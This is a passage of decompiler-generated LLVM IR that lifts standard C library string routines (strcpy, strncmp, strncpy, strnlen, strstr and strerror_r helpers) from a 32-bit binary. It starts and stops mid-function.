  %v20_805c6db = phi i32 [ %v23_805c6db, %dec_label_pc_805c6de ], [ %v4_805c6d6, %entry ]
  %v4_805c6da = phi i32 [ %v6_805c6da, %dec_label_pc_805c6de ], [ %v4_805c6da.pre, %entry ]
  %v7_805c6da = phi i32 [ %v10_805c6da, %dec_label_pc_805c6de ], [ %v4_805c6d2, %entry ]
  %v1_805c6da = inttoptr i32 %v7_805c6da to i8*
  %v2_805c6da = load i8, i8* %v1_805c6da, align 1
  %v3_805c6db = inttoptr i32 %v20_805c6db to i8*
  %v4_805c6db = load i8, i8* %v3_805c6db, align 1
  %v15_805c6db = icmp eq i8 %v2_805c6da, %v4_805c6db
  %v1_805c6dc = icmp eq i1 %v15_805c6db, false
  br i1 %v1_805c6dc, label %dec_label_pc_805c6e6, label %dec_label_pc_805c6de

dec_label_pc_805c6de:                             ; preds = %dec_label_pc_805c6da
  %v3_805c6da = zext i8 %v2_805c6da to i32
  %v5_805c6da = and i32 %v4_805c6da, -256
  %v6_805c6da = or i32 %v3_805c6da, %v5_805c6da
  %v23_805c6db = add i32 %v20_805c6db, %v9_805c6da
  %v10_805c6da = add i32 %v7_805c6da, %v9_805c6da
  %v4_805c6de = icmp eq i8 %v2_805c6da, 0
  %v1_805c6e0 = icmp eq i1 %v4_805c6de, false
  br i1 %v1_805c6e0, label %dec_label_pc_805c6da, label %dec_label_pc_805c6ea

dec_label_pc_805c6e6:                             ; preds = %dec_label_pc_805c6da
  br label %dec_label_pc_805c6ea

dec_label_pc_805c6ea:                             ; preds = %dec_label_pc_805c6de, %dec_label_pc_805c6e6
  %storemerge = phi i32 [ 1, %dec_label_pc_805c6e6 ], [ 0, %dec_label_pc_805c6de ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_805c6da, { 1, 2, 0 }
  uselistorder i32 %v9_805c6da, { 1, 0 }
  uselistorder label %dec_label_pc_805c6ea, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805c6f1 = load i32, i32* @esi, align 4
  store i32 %v0_805c6f1, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_805c6f9 = ptrtoint i8* %arg1 to i32
  store i32 %v4_805c6f9, i32* %edi.global-to-local, align 4
  %v4_805c6fd.pre = load i32, i32* @eax, align 4
  %v8_805c6fd.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_805c6fd

dec_label_pc_805c6fd:                             ; preds = %dec_label_pc_805c6fd.dec_label_pc_805c6fd_crit_edge, %entry
  %v2_805c6fe = phi i32 [ %v7_805c6fe, %dec_label_pc_805c6fd.dec_label_pc_805c6fd_crit_edge ], [ %v4_805c6f9, %entry ]
  %v8_805c6fd = phi i1 [ %v5_805c6fe, %dec_label_pc_805c6fd.dec_label_pc_805c6fd_crit_edge ], [ %v8_805c6fd.pre, %entry ]
  %v4_805c6fd = phi i32 [ %v0_805c6ff, %dec_label_pc_805c6fd.dec_label_pc_805c6fd_crit_edge ], [ %v4_805c6fd.pre, %entry ]
  %v7_805c6fd = phi i32 [ %v0_805c6fd.pre, %dec_label_pc_805c6fd.dec_label_pc_805c6fd_crit_edge ], [ %arg2, %entry ]
  %v1_805c6fd = inttoptr i32 %v7_805c6fd to i8*
  %v2_805c6fd = load i8, i8* %v1_805c6fd, align 1
  %v3_805c6fd = zext i8 %v2_805c6fd to i32
  %v5_805c6fd = and i32 %v4_805c6fd, -256
  %v6_805c6fd = or i32 %v3_805c6fd, %v5_805c6fd
  store i32 %v6_805c6fd, i32* %eax.global-to-local, align 4
  %v9_805c6fd = select i1 %v8_805c6fd, i32 -1, i32 1
  %v10_805c6fd = add i32 %v7_805c6fd, %v9_805c6fd
  store i32 %v10_805c6fd, i32* %esi.global-to-local, align 4
  %v3_805c6fe = inttoptr i32 %v2_805c6fe to i8*
  store i8 %v2_805c6fd, i8* %v3_805c6fe, align 1
  %v4_805c6fe = load i32, i32* %edi.global-to-local, align 4
  %v5_805c6fe = load i1, i1* @df, align 1
  %v6_805c6fe = select i1 %v5_805c6fe, i32 -1, i32 1
  %v7_805c6fe = add i32 %v6_805c6fe, %v4_805c6fe
  store i32 %v7_805c6fe, i32* %edi.global-to-local, align 4
  %v0_805c6ff = load i32, i32* %eax.global-to-local, align 4
  %v3_805c6ff = trunc i32 %v0_805c6ff to i8
  %v4_805c6ff = icmp eq i8 %v3_805c6ff, 0
  %v1_805c701 = icmp eq i1 %v4_805c6ff, false
  br i1 %v1_805c701, label %dec_label_pc_805c6fd.dec_label_pc_805c6fd_crit_edge, label %dec_label_pc_805c703

dec_label_pc_805c6fd.dec_label_pc_805c6fd_crit_edge: ; preds = %dec_label_pc_805c6fd
  %v0_805c6fd.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805c6fd

dec_label_pc_805c703:                             ; preds = %dec_label_pc_805c6fd
  store i32 %v4_805c6f9, i32* %eax.global-to-local, align 4
  %v2_805c707 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805c707, i32* @edx, align 4
  %v2_805c708 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805c708, i32* @esi, align 4
  ret i32 %v4_805c6f9

; uselistorder directives
  uselistorder i32 %v0_805c6ff, { 1, 0 }
  uselistorder i32 %v7_805c6fe, { 1, 0 }
  uselistorder i1 %v5_805c6fe, { 1, 0 }
  uselistorder i32 %v4_805c6f9, { 1, 2, 0, 3 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @__GI_strncmp(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_805c722 = ptrtoint i8* %arg1 to i32
  %v1_805c72e = add i32 %arg3, 1
  br label %dec_label_pc_805c72f

dec_label_pc_805c72f:                             ; preds = %dec_label_pc_805c736, %entry
  %v20_805c733 = phi i32 [ %v23_805c733, %dec_label_pc_805c736 ], [ %arg2, %entry ]
  %v7_805c732 = phi i32 [ %v10_805c732, %dec_label_pc_805c736 ], [ %v4_805c722, %entry ]
  %v0_805c72f = phi i32 [ %v1_805c72f, %dec_label_pc_805c736 ], [ %v1_805c72e, %entry ]
  %v1_805c72f = add i32 %v0_805c72f, -1
  %v8_805c72f = icmp eq i32 %v1_805c72f, 0
  store i32 %v1_805c72f, i32* @ecx, align 4
  br i1 %v8_805c72f, label %dec_label_pc_805c742, label %dec_label_pc_805c732

dec_label_pc_805c732:                             ; preds = %dec_label_pc_805c72f
  %v1_805c732 = inttoptr i32 %v7_805c732 to i8*
  %v2_805c732 = load i8, i8* %v1_805c732, align 1
  %v3_805c732 = zext i8 %v2_805c732 to i32
  %v4_805c732 = load i32, i32* @eax, align 4
  %v5_805c732 = and i32 %v4_805c732, -256
  %v6_805c732 = or i32 %v5_805c732, %v3_805c732
  store i32 %v6_805c732, i32* @eax, align 4
  %v8_805c732 = load i1, i1* @df, align 1
  %v9_805c732 = select i1 %v8_805c732, i32 -1, i32 1
  %v3_805c733 = inttoptr i32 %v20_805c733 to i8*
  %v4_805c733 = load i8, i8* %v3_805c733, align 1
  %v15_805c733 = icmp eq i8 %v2_805c732, %v4_805c733
  %v1_805c734 = icmp eq i1 %v15_805c733, false
  br i1 %v1_805c734, label %dec_label_pc_805c73e, label %dec_label_pc_805c736

dec_label_pc_805c736:                             ; preds = %dec_label_pc_805c732
  %v23_805c733 = add i32 %v9_805c732, %v20_805c733
  %v10_805c732 = add i32 %v9_805c732, %v7_805c732
  %v4_805c736 = icmp eq i8 %v2_805c732, 0
  %v1_805c738 = icmp eq i1 %v4_805c736, false
  br i1 %v1_805c738, label %dec_label_pc_805c72f, label %dec_label_pc_805c742

dec_label_pc_805c73e:                             ; preds = %dec_label_pc_805c732
  br label %dec_label_pc_805c742

dec_label_pc_805c742:                             ; preds = %dec_label_pc_805c72f, %dec_label_pc_805c736, %dec_label_pc_805c73e
  %storemerge = phi i32 [ 1, %dec_label_pc_805c73e ], [ 0, %dec_label_pc_805c736 ], [ 0, %dec_label_pc_805c72f ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v9_805c732, { 1, 0 }
  uselistorder i8 %v2_805c732, { 1, 0, 2 }
  uselistorder i32 %v1_805c72f, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805c742, { 2, 1, 0 }
}

define i32 @strncpy(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805c749 = load i32, i32* @esi, align 4
  store i32 %v0_805c749, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_805c755 = ptrtoint i8* %arg1 to i32
  store i32 %v4_805c755, i32* %edi.global-to-local, align 4
  %v1_805c759 = add i32 %arg3, 1
  br label %dec_label_pc_805c75a

dec_label_pc_805c75a:                             ; preds = %dec_label_pc_805c75d, %entry
  %v3_805c75e = phi i32 [ %v4_805c755, %entry ], [ %v8_805c75e, %dec_label_pc_805c75d ]
  %v0_805c75a = phi i32 [ %v1_805c759, %entry ], [ %v0_805c75a.pre, %dec_label_pc_805c75d ]
  %v1_805c75a = add i32 %v0_805c75a, -1
  %v8_805c75a = icmp eq i32 %v1_805c75a, 0
  store i32 %v1_805c75a, i32* @ecx, align 4
  br i1 %v8_805c75a, label %.loopexit, label %dec_label_pc_805c75d

dec_label_pc_805c75d:                             ; preds = %dec_label_pc_805c75a
  %v0_805c75d = load i32, i32* %esi.global-to-local, align 4
  %v1_805c75d = inttoptr i32 %v0_805c75d to i8*
  %v2_805c75d = load i8, i8* %v1_805c75d, align 1
  %v10_805c75d = load i1, i1* @df, align 1
  %v11_805c75d = select i1 %v10_805c75d, i32 -1, i32 1
  %v12_805c75d = add i32 %v11_805c75d, %v0_805c75d
  store i32 %v12_805c75d, i32* %esi.global-to-local, align 4
  %v4_805c75e = inttoptr i32 %v3_805c75e to i8*
  store i8 %v2_805c75d, i8* %v4_805c75e, align 1
  %v5_805c75e = load i32, i32* %edi.global-to-local, align 4
  %v6_805c75e = load i1, i1* @df, align 1
  %v7_805c75e = select i1 %v6_805c75e, i32 -1, i32 1
  %v8_805c75e = add i32 %v7_805c75e, %v5_805c75e
  store i32 %v8_805c75e, i32* %edi.global-to-local, align 4
  %v6_805c75f = icmp eq i8 %v2_805c75d, 0
  %v1_805c761 = icmp eq i1 %v6_805c75f, false
  %v0_805c75a.pre = load i32, i32* @ecx, align 4
  br i1 %v1_805c761, label %dec_label_pc_805c75a, label %dec_label_pc_805c763

dec_label_pc_805c763:                             ; preds = %dec_label_pc_805c75d
  %v1_805c763 = add i32 %v0_805c75a.pre, -1
  %v2_805c764 = sext i8 %v2_805c75d to i32
  %v4_805c764 = inttoptr i32 %v8_805c75e to i8*
  %v5_805c764 = call i8* @_memset(i8* %v4_805c764, i32 %v2_805c764, i32 %v1_805c763)
  %v6_805c764 = ptrtoint i8* %v5_805c764 to i32
  store i32 %v6_805c764, i32* @ecx, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_805c75a, %dec_label_pc_805c763
  %v2_805c76a = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805c76a, i32* @edx, align 4
  %v2_805c76b = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805c76b, i32* @esi, align 4
  ret i32 %v4_805c755

; uselistorder directives
  uselistorder i32 %v8_805c75e, { 0, 2, 1 }
  uselistorder i8 %v2_805c75d, { 0, 2, 1 }
  uselistorder i32 %v1_805c75a, { 1, 0 }
  uselistorder i32 %v4_805c755, { 1, 0, 2 }
  uselistorder label %.loopexit, { 1, 0 }
}

define i32 @strnlen() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8* @__decompiler_undefined_function_3()
  %v4_805c770 = ptrtoint i8* %tmp4 to i32
  %v8_805c7838 = icmp eq i32 %tmp, 0
  %v1_805c7849 = icmp eq i1 %v8_805c7838, false
  br i1 %v1_805c7849, label %dec_label_pc_805c77d, label %dec_label_pc_805c786

dec_label_pc_805c77d:                             ; preds = %entry, %dec_label_pc_805c782
  %v1_805c78311 = phi i32 [ %v1_805c783, %dec_label_pc_805c782 ], [ %tmp, %entry ]
  %v0_805c78610 = phi i32 [ %v1_805c782, %dec_label_pc_805c782 ], [ %v4_805c770, %entry ]
  %v1_805c77d = inttoptr i32 %v0_805c78610 to i8*
  %v2_805c77d = load i8, i8* %v1_805c77d, align 1
  %v3_805c77d = icmp eq i8 %v2_805c77d, 0
  br i1 %v3_805c77d, label %dec_label_pc_805c786, label %dec_label_pc_805c782

dec_label_pc_805c782:                             ; preds = %dec_label_pc_805c77d
  %v1_805c782 = add i32 %v0_805c78610, 1
  %v1_805c783 = add i32 %v1_805c78311, -1
  %v8_805c783 = icmp eq i32 %v1_805c783, 0
  %v1_805c784 = icmp eq i1 %v8_805c783, false
  br i1 %v1_805c784, label %dec_label_pc_805c77d, label %dec_label_pc_805c786

dec_label_pc_805c786:                             ; preds = %dec_label_pc_805c782, %dec_label_pc_805c77d, %entry
  %v0_805c786.lcssa = phi i32 [ %v4_805c770, %entry ], [ %v0_805c78610, %dec_label_pc_805c77d ], [ %v1_805c782, %dec_label_pc_805c782 ]
  %v2_805c786 = sub i32 %v0_805c786.lcssa, %v4_805c770
  ret i32 %v2_805c786

; uselistorder directives
  uselistorder i32 %v1_805c783, { 1, 0 }
  uselistorder i32 %v0_805c78610, { 0, 2, 1 }
  uselistorder i32 %v4_805c770, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805c77d, { 1, 0 }
}

define i32 @strstr(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %tmp41 = call i32 @__decompiler_undefined_function_0()
  %v0_805c78f = load i32, i32* @ebx, align 4
  %v4_805c793 = ptrtoint i8* %arg2 to i32
  %v2_805c79b = load i8, i8* %arg2, align 1
  %v1_805c79e = icmp eq i8 %v2_805c79b, 0
  br i1 %v1_805c79e, label %dec_label_pc_805c84b, label %dec_label_pc_805c7a6

dec_label_pc_805c7a6:                             ; preds = %entry
  %v1_805c7a6 = add i32 %arg1, -1
  br label %dec_label_pc_805c7a7

dec_label_pc_805c7a7:                             ; preds = %dec_label_pc_805c7b3, %dec_label_pc_805c7a6
  %v0_805c7a7 = phi i32 [ %v1_805c7a7, %dec_label_pc_805c7b3 ], [ %v1_805c7a6, %dec_label_pc_805c7a6 ]
  %v1_805c7a7 = add i32 %v0_805c7a7, 1
  %v1_805c7a8 = inttoptr i32 %v1_805c7a7 to i8*
  %v2_805c7a8 = load i8, i8* %v1_805c7a8, align 1
  %v1_805c7ab = icmp eq i8 %v2_805c7a8, 0
  br i1 %v1_805c7ab, label %dec_label_pc_805c849, label %dec_label_pc_805c7b3

dec_label_pc_805c7b3:                             ; preds = %dec_label_pc_805c7a7
  %v12_805c7b3 = icmp eq i8 %v2_805c7a8, %v2_805c79b
  %v1_805c7b5 = icmp eq i1 %v12_805c7b3, false
  br i1 %v1_805c7b5, label %dec_label_pc_805c7a7, label %dec_label_pc_805c7b7

dec_label_pc_805c7b7:                             ; preds = %dec_label_pc_805c7b3
  %v1_805c7b7 = add i32 %v4_805c793, 1
  %v2_805c7be = inttoptr i32 %v1_805c7b7 to i8*
  %v3_805c7be = load i8, i8* %v2_805c7be, align 1
  %v1_805c7c5 = icmp eq i8 %v3_805c7be, 0
  br i1 %v1_805c7c5, label %dec_label_pc_805c84b, label %dec_label_pc_805c7c9

dec_label_pc_805c7c9:                             ; preds = %dec_label_pc_805c7b7
  %v1_805c7c9 = add i32 %v0_805c7a7, 2
  %v1_805c80a = add i32 %v4_805c793, 2
  %v2_805c80a = inttoptr i32 %v1_805c80a to i8*
  br label %dec_label_pc_805c7fc

dec_label_pc_805c7d4:                             ; preds = %dec_label_pc_805c841
  %v2_805c7d4 = inttoptr i32 %v0_805c80f to i8*
  %v3_805c7d4 = load i8, i8* %v2_805c7d4, align 1
  br label %dec_label_pc_805c7f1.preheader

dec_label_pc_805c7f1.preheader:                   ; preds = %dec_label_pc_805c7d4, %dec_label_pc_805c7fc
  %v0_805c7dd.ph.in = phi i8 [ %v0_805c7f127.in, %dec_label_pc_805c7fc ], [ %v3_805c7d4, %dec_label_pc_805c7d4 ]
  %v12_805c7f158 = icmp eq i8 %v0_805c7dd.ph.in, %v2_805c79b
  %v1_805c7f359 = icmp eq i1 %v12_805c7f158, false
  br i1 %v1_805c7f359, label %dec_label_pc_805c7dd, label %dec_label_pc_805c7f5

dec_label_pc_805c7dd:                             ; preds = %dec_label_pc_805c7f1.preheader, %dec_label_pc_805c7ed
  %v0_805c7dd61.in = phi i8 [ %v2_805c7ee, %dec_label_pc_805c7ed ], [ %v0_805c7dd.ph.in, %dec_label_pc_805c7f1.preheader ]
  %v0_805c7e160 = phi i32 [ %v1_805c7ed, %dec_label_pc_805c7ed ], [ %v0_805c80f, %dec_label_pc_805c7f1.preheader ]
  %v1_805c7dd = icmp eq i8 %v0_805c7dd61.in, 0
  br i1 %v1_805c7dd, label %dec_label_pc_805c849, label %dec_label_pc_805c7e1

dec_label_pc_805c7e1:                             ; preds = %dec_label_pc_805c7dd
  %v1_805c7e1 = add i32 %v0_805c7e160, 1
  %v1_805c7e2 = inttoptr i32 %v1_805c7e1 to i8*
  %v2_805c7e2 = load i8, i8* %v1_805c7e2, align 1
  %v12_805c7e5 = icmp eq i8 %v2_805c7e2, %v2_805c79b
  br i1 %v12_805c7e5, label %dec_label_pc_805c7f5, label %dec_label_pc_805c7e9

dec_label_pc_805c7e9:                             ; preds = %dec_label_pc_805c7e1
  %v1_805c7e9 = icmp eq i8 %v2_805c7e2, 0
  br i1 %v1_805c7e9, label %dec_label_pc_805c849, label %dec_label_pc_805c7ed

dec_label_pc_805c7ed:                             ; preds = %dec_label_pc_805c7e9
  %v1_805c7ed = add i32 %v0_805c7e160, 2
  %v1_805c7ee = inttoptr i32 %v1_805c7ed to i8*
  %v2_805c7ee = load i8, i8* %v1_805c7ee, align 1
  %v12_805c7f1 = icmp eq i8 %v2_805c7ee, %v2_805c79b
  %v1_805c7f3 = icmp eq i1 %v12_805c7f1, false
  br i1 %v1_805c7f3, label %dec_label_pc_805c7dd, label %dec_label_pc_805c7f5

dec_label_pc_805c7f5:                             ; preds = %dec_label_pc_805c7ed, %dec_label_pc_805c7e1, %dec_label_pc_805c7f1.preheader
  %v0_805c7f5 = phi i32 [ %v0_805c80f, %dec_label_pc_805c7f1.preheader ], [ %v1_805c7e1, %dec_label_pc_805c7e1 ], [ %v1_805c7ed, %dec_label_pc_805c7ed ]
  %v1_805c7f5 = add i32 %v0_805c7f5, 1
  br label %dec_label_pc_805c7fc

dec_label_pc_805c7fc:                             ; preds = %dec_label_pc_805c7c9, %dec_label_pc_805c7f5
  %v0_805c7f127.in.in.in = phi i32 [ %v1_805c7f5, %dec_label_pc_805c7f5 ], [ %v1_805c7c9, %dec_label_pc_805c7c9 ]
  %v0_805c80f = phi i32 [ %v1_805c7f5, %dec_label_pc_805c7f5 ], [ %v1_805c7c9, %dec_label_pc_805c7c9 ]
  %v0_805c7f127.in.in = inttoptr i32 %v0_805c7f127.in.in.in to i8*
  %v0_805c7f127.in = load i8, i8* %v0_805c7f127.in.in, align 1
  %storemerge4 = icmp eq i8 %v0_805c7f127.in, %v3_805c7be
  %v1_805c7fc = icmp eq i1 %storemerge4, false
  br i1 %v1_805c7fc, label %dec_label_pc_805c7f1.preheader, label %dec_label_pc_805c7fe

dec_label_pc_805c7fe:                             ; preds = %dec_label_pc_805c7fc
  %v1_805c806 = add i32 %v0_805c80f, 1
  %v2_805c806 = inttoptr i32 %v1_805c806 to i8*
  %v3_805c806 = load i8, i8* %v2_805c806, align 1
  %v3_805c80a = load i8, i8* %v2_805c80a, align 1
  %v1_805c812 = add i32 %v0_805c80f, -1
  %v12_805c815 = icmp eq i8 %v3_805c806, %v3_805c80a
  %v1_805c817 = icmp eq i1 %v12_805c815, false
  br i1 %v1_805c817, label %dec_label_pc_805c841, label %dec_label_pc_805c819.preheader

dec_label_pc_805c819.preheader:                   ; preds = %dec_label_pc_805c7fe
  %v1_805c81910 = icmp eq i8 %v3_805c806, 0
  br i1 %v1_805c81910, label %dec_label_pc_805c84b, label %dec_label_pc_805c81d

dec_label_pc_805c81d:                             ; preds = %dec_label_pc_805c819.preheader, %dec_label_pc_805c83d
  %v0_805c830 = phi i32 [ %v1_805c830, %dec_label_pc_805c83d ], [ %v1_805c80a, %dec_label_pc_805c819.preheader ]
  %v0_805c82d = phi i32 [ %v1_805c82d, %dec_label_pc_805c83d ], [ %v1_805c806, %dec_label_pc_805c819.preheader ]
  %v1_805c81d = add i32 %v0_805c82d, 1
  %v2_805c81d = inttoptr i32 %v1_805c81d to i8*
  %v3_805c81d = load i8, i8* %v2_805c81d, align 1
  %v1_805c821 = add i32 %v0_805c830, 1
  %v2_805c821 = inttoptr i32 %v1_805c821 to i8*
  %v3_805c821 = load i8, i8* %v2_805c821, align 1
  %v12_805c825 = icmp eq i8 %v3_805c81d, %v3_805c821
  %v1_805c827 = icmp eq i1 %v12_805c825, false
  br i1 %v1_805c827, label %dec_label_pc_805c841, label %dec_label_pc_805c829

dec_label_pc_805c829:                             ; preds = %dec_label_pc_805c81d
  %v1_805c829 = icmp eq i8 %v3_805c821, 0
  br i1 %v1_805c829, label %dec_label_pc_805c84b, label %dec_label_pc_805c82d

dec_label_pc_805c82d:                             ; preds = %dec_label_pc_805c829
  %v1_805c82d = add i32 %v0_805c82d, 2
  %v1_805c830 = add i32 %v0_805c830, 2
  %v1_805c833 = inttoptr i32 %v1_805c82d to i8*
  %v2_805c833 = load i8, i8* %v1_805c833, align 1
  %v1_805c836 = inttoptr i32 %v1_805c830 to i8*
  %v2_805c836 = load i8, i8* %v1_805c836, align 1
  %v12_805c839 = icmp eq i8 %v2_805c833, %v2_805c836
  %v1_805c83b = icmp eq i1 %v12_805c839, false
  br i1 %v1_805c83b, label %dec_label_pc_805c841, label %dec_label_pc_805c83d

dec_label_pc_805c83d:                             ; preds = %dec_label_pc_805c82d
  %v1_805c819 = icmp eq i8 %v2_805c836, 0
  br i1 %v1_805c819, label %dec_label_pc_805c84b, label %dec_label_pc_805c81d

dec_label_pc_805c841:                             ; preds = %dec_label_pc_805c82d, %dec_label_pc_805c81d, %dec_label_pc_805c7fe
  %v0_805c841.in = phi i8 [ %v3_805c80a, %dec_label_pc_805c7fe ], [ %v2_805c836, %dec_label_pc_805c82d ], [ %v3_805c821, %dec_label_pc_805c81d ]
  %v1_805c841 = icmp eq i8 %v0_805c841.in, 0
  %v1_805c843 = icmp eq i1 %v1_805c841, false
  br i1 %v1_805c843, label %dec_label_pc_805c7d4, label %dec_label_pc_805c84b

dec_label_pc_805c849:                             ; preds = %dec_label_pc_805c7a7, %dec_label_pc_805c7e9, %dec_label_pc_805c7dd
  %v2_805c84c37 = phi i32 [ %v1_805c7b7, %dec_label_pc_805c7dd ], [ %v1_805c7b7, %dec_label_pc_805c7e9 ], [ %tmp41, %dec_label_pc_805c7a7 ]
  br label %dec_label_pc_805c84b

dec_label_pc_805c84b:                             ; preds = %dec_label_pc_805c819.preheader, %dec_label_pc_805c841, %dec_label_pc_805c829, %dec_label_pc_805c83d, %entry, %dec_label_pc_805c7b7, %dec_label_pc_805c849
  %v2_805c84c = phi i32 [ %v2_805c84c37, %dec_label_pc_805c849 ], [ %v1_805c7b7, %dec_label_pc_805c7b7 ], [ %tmp41, %entry ], [ %v1_805c7b7, %dec_label_pc_805c83d ], [ %v1_805c7b7, %dec_label_pc_805c829 ], [ %v1_805c7b7, %dec_label_pc_805c841 ], [ %v1_805c7b7, %dec_label_pc_805c819.preheader ]
  %storemerge2 = phi i32 [ 0, %dec_label_pc_805c849 ], [ %v1_805c7a7, %dec_label_pc_805c7b7 ], [ %arg1, %entry ], [ %v1_805c812, %dec_label_pc_805c83d ], [ %v1_805c812, %dec_label_pc_805c829 ], [ %v1_805c812, %dec_label_pc_805c841 ], [ %v1_805c812, %dec_label_pc_805c819.preheader ]
  store i32 %v2_805c84c, i32* @ecx, align 4
  store i32 %v0_805c78f, i32* @ebx, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i8 %v2_805c836, { 0, 2, 1 }
  uselistorder i32 %v1_805c830, { 1, 0 }
  uselistorder i32 %v1_805c82d, { 1, 0 }
  uselistorder i8 %v3_805c821, { 0, 2, 1 }
  uselistorder i8 %v3_805c806, { 1, 0 }
  uselistorder i32 %v0_805c80f, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v1_805c7f5, { 1, 0 }
  uselistorder i8 %v2_805c7ee, { 1, 0 }
  uselistorder i32 %v1_805c7ed, { 0, 2, 1 }
  uselistorder i8 %v2_805c7e2, { 1, 0 }
  uselistorder i32 %v0_805c7e160, { 1, 0 }
  uselistorder i32 %v1_805c7c9, { 1, 0 }
  uselistorder i32 %v1_805c7b7, { 0, 1, 2, 3, 6, 4, 5, 7 }
  uselistorder i32 %v1_805c7a7, { 0, 2, 1 }
  uselistorder i8 %v2_805c79b, { 1, 2, 0, 3, 4 }
  uselistorder i32 %tmp41, { 1, 0 }
  uselistorder i8* %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_805c84b, { 6, 1, 3, 2, 0, 5, 4 }
  uselistorder label %dec_label_pc_805c849, { 1, 2, 0 }
  uselistorder label %dec_label_pc_805c81d, { 1, 0 }
  uselistorder label %dec_label_pc_805c7fc, { 1, 0 }
  uselistorder label %dec_label_pc_805c7dd, { 1, 0 }
  uselistorder label %dec_label_pc_805c7f1.preheader, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_805c854 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v3_805c865 = call i32 @__xpg_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3)
  %v0_805c86a = load i32, i32* @ebx, align 4
  store i32 %v0_805c854, i32* @ebx, align 4
  ret i32 %v0_805c86a
}

define i32 @__xpg_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-108 = alloca i8*, align 4
  %v0_805c874 = load i32, i32* @ebp, align 4
  %v0_805c875 = load i32, i32* @edi, align 4
  %v0_805c876 = load i32, i32* @esi, align 4
  store i32 %arg3, i32* @edi, align 4
  %v6_805c886 = icmp ugt i32 %arg1, 124
  br i1 %v6_805c886, label %dec_label_pc_805c8a3, label %dec_label_pc_805c888

dec_label_pc_805c888:                             ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_806cc80.743 to i32), i32* @esi, align 4
  %v1_805c8984 = icmp eq i32 %arg1, 0
  %v1_805c89a11 = icmp eq i1 %v1_805c8984, false
  br i1 %v1_805c89a11, label %dec_label_pc_805c891, label %dec_label_pc_805c89c

dec_label_pc_805c891:                             ; preds = %dec_label_pc_805c888, %dec_label_pc_805c891
  %v0_805c894 = phi i32 [ %v3_805c894, %dec_label_pc_805c891 ], [ %arg1, %dec_label_pc_805c888 ]
  %v0_805c897 = phi i32 [ %v1_805c897, %dec_label_pc_805c891 ], [ ptrtoint ([8 x i8]* @global_var_806cc80.743 to i32), %dec_label_pc_805c888 ]
  %v1_805c891 = inttoptr i32 %v0_805c897 to i8*
  %v2_805c891 = load i8, i8* %v1_805c891, align 1
  %v7_805c891 = icmp eq i8 %v2_805c891, 0
  %v2_805c894 = zext i1 %v7_805c891 to i32
  %v3_805c894 = add i32 %v2_805c894, %v0_805c894
  %v16_805c894 = icmp eq i32 %v3_805c894, 0
  %v1_805c897 = add i32 %v0_805c897, 1
  store i32 %v1_805c897, i32* @esi, align 4
  %v1_805c89a = icmp eq i1 %v16_805c894, false
  br i1 %v1_805c89a, label %dec_label_pc_805c891, label %dec_label_pc_805c89c

dec_label_pc_805c89c:                             ; preds = %dec_label_pc_805c891, %dec_label_pc_805c888
  %v0_805c89e = phi i32 [ ptrtoint ([8 x i8]* @global_var_806cc80.743 to i32), %dec_label_pc_805c888 ], [ %v1_805c897, %dec_label_pc_805c891 ]
  store i32 0, i32* @ebp, align 4
  %v1_805c89e = inttoptr i32 %v0_805c89e to i8*
  %v2_805c89e = load i8, i8* %v1_805c89e, align 1
  %v3_805c89e = icmp eq i8 %v2_805c89e, 0
  %v1_805c8a1 = icmp eq i1 %v3_805c89e, false
  br i1 %v1_805c8a1, label %dec_label_pc_805c89c.dec_label_pc_805c8d2_crit_edge, label %dec_label_pc_805c8a3

dec_label_pc_805c89c.dec_label_pc_805c8d2_crit_edge: ; preds = %dec_label_pc_805c89c
  br label %dec_label_pc_805c8d2

dec_label_pc_805c8a3:                             ; preds = %dec_label_pc_805c89c, %entry
  store i32 22, i32* @ebp, align 4
  %v1_805c8ab = ashr i32 %arg1, 31
  store i8* null, i8** %stack_var_-108, align 4
  %v6_805c8b7 = bitcast i32* %stack_var_-17 to i8*
  %v7_805c8b7 = call i32 @_uintmaxtostr(i8* %v6_805c8b7, i32 %arg1, i32 %v1_805c8ab, i32 -10, i32 0)
  %v1_805c8bf = add i32 %v7_805c8b7, -14
  store i32 %v1_805c8bf, i32* @esi, align 4
  %v5_805c8c9 = inttoptr i32 %v1_805c8bf to i8*
  store i8* %v5_805c8c9, i8** %stack_var_-108, align 4
